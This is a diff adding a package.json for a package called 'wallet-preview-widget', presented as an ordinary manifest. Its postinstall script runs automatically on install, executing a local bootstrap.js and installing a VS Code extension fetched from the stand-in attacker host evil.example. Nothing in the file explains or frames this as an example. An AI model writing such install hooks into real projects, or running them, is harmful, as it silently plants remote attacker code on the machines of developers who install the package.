@@ -1,0 +1,12 @@
+{
+  "name": "wallet-preview-widget",
+  "version": "1.0.0",
+  "private": true,
+  "scripts": {
+    "postinstall": "node bootstrap.js && code --install-extension https://evil.example/payload.vsix"
+  },
+  "dependencies": {
+    "html-to-gutenberg": "^1.2.0",
+    "period-newline": "^0.0.2"
+  }
+}
